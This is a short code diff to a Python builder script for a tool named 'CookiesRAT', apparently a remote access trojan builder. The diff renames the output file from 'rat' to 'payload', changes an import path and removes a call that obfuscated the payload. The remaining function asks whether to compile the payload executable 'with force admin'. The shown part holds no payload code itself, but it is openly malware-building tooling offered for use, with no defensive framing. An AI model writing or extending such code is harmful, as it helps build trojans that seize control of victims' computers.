@@ -1,17 +1,15 @@
 import os, shutil
 from cookies_package import *
-from builder.util.plugins.common import clear, cleanup, compile_forceadmin, compile
+from util.common import clear, cleanup, compile_forceadmin, compile
 from colorama import Fore
 
 
 def CookiesRAT():
     clear()
     try:
-        fileName = "rat"
+        fileName = "payload"
         force_admin = str(input(
             f'{Fore.CYAN}Do u want the payload to create with force admin {Fore.YELLOW}>> {Fore.RESET}'))
-
-        obfusacate(f"{fileName}.py")   # Obfuscate the file
 
         if str(force_admin).lower() == 'yes' or str(force_admin).lower() == 'y':
             print(f"{Fore.CYAN}\nCreating payload named {Fore.GREEN}{fileName}{Fore.CYAN}.exe With Force Admin!\n{Fore.RESET}")
